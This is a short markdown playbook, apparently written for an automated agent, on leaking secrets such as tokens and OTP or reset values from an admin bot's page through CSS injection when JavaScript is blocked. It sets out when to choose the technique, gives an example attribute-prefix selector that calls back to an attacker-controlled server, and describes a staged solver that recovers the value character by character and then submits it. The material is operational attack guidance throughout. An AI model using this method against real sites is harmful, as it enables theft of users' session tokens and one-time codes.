# CSS staged exfiltration primitive lock

Use this reference only when evidence points to admin-bot/browser HTML injection where JavaScript is blocked or unreliable but attacker-controlled external stylesheets may load.

## Promotion signals

Immediately promote CSS staged prefix exfiltration via attacker-controlled external stylesheets to top-1 when all of these signals exist:

- HTML injection into an admin-bot/browser page.
- The secret appears in DOM text or an attribute, especially `input[value]`, `textarea`, `data-*`, hidden fields, token fields, or OTP/reset values.
- JavaScript is blocked or unavailable, e.g. `script-src 'none'`, but images/stylesheets/fonts are not fully blocked.
- `<link rel="stylesheet" href="https://attacker/...">` or another attacker-controlled resource can be loaded by the bot.

## First safe check

1. Do not stop at OAST/interactsh fixed responses. Start a tiny attacker-controlled HTTP server that can return dynamic CSS.
2. Serve one stylesheet with one harmless prefix rule, e.g. `input[value^="A"] { background-image: url("/capture/A") }`, plus a baseline resource to prove stylesheet loading.
3. If a conditional callback fires, immediately build a staged solver: emit `N+1` stylesheets, gate `/style/<stage>` on the current leaked prefix, return rules for all candidate next characters, update state in `/capture/<prefix>`, then submit `/flag?otp=<leaked>` with the same session.
4. Treat one failed inline `data:` CSS, OAST CSS, element-background, `:has`, font, or pseudo-element probe as weak evidence only. It does not falsify the staged external stylesheet primitive unless a controlled stylesheet response is proven loaded and a simple known-matching selector also fails.

## Stop / pivot rule

Only pivot away after all of these are recorded:

- attacker-controlled external stylesheet server is reachable from the bot
- baseline CSS loads
- a known-true selector fails to trigger
- browser/runtime evidence is recorded

Until then, do not spend probe budget on cookie/session guessing, `body::before`, meta-CSP, container queries, font glyph side channels, or unrelated auth/session branches.
